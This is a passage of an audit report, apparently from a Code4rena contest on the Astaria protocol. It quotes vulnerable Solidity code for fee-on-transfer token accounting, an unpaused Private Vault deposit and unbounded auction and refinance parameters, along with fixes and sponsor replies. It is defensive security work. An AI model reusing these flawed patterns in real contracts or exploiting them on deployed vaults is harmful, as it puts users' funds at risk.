class=\"mtk12\">TRANSFER_PROXY</span><span class=\"mtk1\">.</span><span class=\"mtk11\">tokenTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>if the token charge transfer fee, for example, the payment amount is 100 ETH. 1 ETH is charged as fee, the recipient only receive 99 ETH,</p>\n<p>but the wrong value payment 100 ETH is returned and used to update the accounting</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"136\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">spent</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_paymentAH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">, </span><span class=\"mtk12\">i</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payment</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">totalSpent</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">spent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">payment</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">spent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Then the variable totalSpent and payment amount will be not valid.</p>\n<h3 id=\"recommended-mitigation-steps-49\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-49\" aria-label=\"recommended mitigation steps 49 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol whitelist the token address or use balance before and after check to make sure the recipient receives the accurate amount of token when token transfer is performed.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/51#issuecomment-1412982619\">SantiagoGregory (Astaria) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>USDC and USDT fees would break other contracts as well, and we won’t be supporting other tokens with fees at a UI level.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-34-pause-checks-are-missing-on-deposit-for-private-vault\" style=\"position:relative;\"><a href=\"#m-34-pause-checks-are-missing-on-deposit-for-private-vault\" aria-label=\"m 34 pause checks are missing on deposit for private vault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/25\">[M-34] Pause checks are missing on deposit for Private Vault</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/25\">csanuragjain</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/635\">0xbepresent</a></em></p>\n<p>It is possible to make a deposit even when <code>_loadVISlot().isShutdown</code> is true. This check is done in <code>whenNotPaused</code> modifier and is already done for Public Vault but is missing for Private Vault, allowing unexpected deposits.</p>\n<h3 id=\"proof-of-concept-46\" style=\"position:relative;\"><a href=\"#proof-of-concept-46\" aria-label=\"proof of concept 46 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ol>\n<li>Observe the deposit function at <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L59\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/Vault.sol#L59</a></li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"137\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function deposit(uint256 amount, address receiver)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        public</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        virtual</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        returns (uint256)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        VIData storage s = _loadVISlot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(s.allowList[msg.sender] &amp;&amp; receiver == owner());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span></code></pre>\n<ol start=\"2\">\n<li>Observe there is no <code>whenNotPaused</code> modifier in deposit which confirm that shutdown has not been called yet</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"138\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    modifier whenNotPaused() {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (ROUTER().paused()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          revert InvalidRequest(InvalidRequestReason.PAUSED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (_loadVISlot().isShutdown) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          revert InvalidRequest(InvalidRequestReason.SHUTDOWN);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-50\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-50\" aria-label=\"recommended mitigation steps 50 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Revise the deposit function as below:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"139\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function deposit(uint256 amount, address receiver)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    public</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    virtual </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    whenNotPaused</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    returns (uint256)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    VIData storage s = _loadVISlot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(s.allowList[msg.sender] &amp;&amp; receiver == owner());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/25#issuecomment-1405587817\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>It makes sense though considering it’s a private vault so only the owner can deposit.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/25\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this audit, 56 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/77#issuecomment-1441635234\">report highlighted below</a> by <strong>ladboy233</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/617\">rbserver</a>,\n<a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/612\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/598\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/592\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/591\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/590\">Qeew</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/584\">evan</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/583\">slvDev</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/572\">tnevler</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/567\">Deekshith99</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/563\">lukris02</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/560\">0xAgro</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/558\">a12jmx</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/545\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/541\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/536\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/515\">oberon</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/512\">pfapostol</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/506\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/501\">gz627</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/464\">ayeslick</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/447\">synackrst</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/443\">sakshamguruji</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/415\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/411\">ast3ros</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/397\">PaludoX0</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/380\">kaden</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/373\">simon135</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/352\">nicobevi</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/341\">caventa</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/293\">Koolex</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/258\">nogo</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/253\">whilom</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/244\">zaskoh</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/240\">shark</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/215\">Kaysoft</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/212\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/206\">Cryptor</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/203\">0xkato</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/187\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/181\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/170\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/165\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/161\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/128\">seeu</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/106\">HE1M</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/81\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/65\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/55\">Tointer</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/47\">btk</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/43\">georgits</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/24\">Sathish9098</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/12\">arialblack14</a>, <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/10\">descharre</a>, and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/7\">oyc_109</a>.</em></p>\n<h2 id=\"01-lack-of-reasonable-boundary-for-parameter-setting-in-fee-setting-and-liquidation-auction-length-and-refinance-setting-and-epoch-length\" style=\"position:relative;\"><a href=\"#01-lack-of-reasonable-boundary-for-parameter-setting-in-fee-setting-and-liquidation-auction-length-and-refinance-setting-and-epoch-length\" aria-label=\"01 lack of reasonable boundary for parameter setting in fee setting and liquidation auction length and refinance setting and epoch length permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/77\">[01] Lack of reasonable boundary for parameter setting in fee setting and liquidation auction length and refinance setting and epoch length</a></h2>\n<p>According to the documentation,</p>\n<p><a href=\"https://docs.astaria.xyz/docs/protocol-mechanics/liquidations\">https://docs.astaria.xyz/docs/protocol-mechanics/liquidations</a></p>\n<blockquote>\n<p>Auction lengths are set to 72 hours, and will follow a Dutch Auction process.</p>\n</blockquote>\n<p>In the constructor of the AstariaRouter.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"140\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindow</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindowBuffer</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>but these parameter can be adjusted with no boundary restriction in the function file</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"141\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_file</span><span class=\"mtk1\">(</span><span class=\"mtk12\">File</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\"> </span><span class=\"mtk12\">what</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">what</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">incoming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">data</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">what</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">FileType</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AuctionWindow</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">window</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">windowBuffer</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindow</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">window</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">auctionWindowBuffer</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">windowBuffer</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeCastTo32</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Admin can adjust the auction length to very short or very long, which violates the documentation.</p>\n<p>If the admin adjust the auction length to very short, for example, 2 hours, the auction time is too short to let people purchase off the outstanding debt, and the lender has to bear the loss.</p>\n<p>If the auction length is too long, for example, 2000 days, this basically equal to lock the NFT auction fund and the lender will not get paid either.</p>\n<p>According to documentation</p>\n<p><a href=\"https://docs.astaria.xyz/docs/protocol-mechanics/refinance\">https://docs.astaria.xyz/docs/protocol-mechanics/refinance</a></p>\n<blockquote>\n<p>An improvement in terms is considered if either of these conditions is met:<br>\nThe loan interest rate decrease by more than 0.05%.<br>\nThe loan duration increases by more than 14 days.</p>\n</blockquote>\n<p>However, in the constructor of the AstariaRouter.sol such parameter is not enforced. The s.minDurationIncrease is set to 5 days, not 14 days.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"142\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minDurationIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">5</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>which impact the refinance logic</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"143\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">isValidRefinance</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ILienToken.Lien </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">position</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ILienToken.Stack[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">RouterStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadRouterSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxNewRate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk12\">position</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minInterestBPS</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">stack</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">lien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidRefinanceCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      (</span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxNewRate</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">newLien</span><span class=\"mtk1\">.</span><span class=\"mtk12\">details</span><span class=\"mtk1\">.</span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;=</span></span></span>\n<span class=\"grvsc-line\"><span 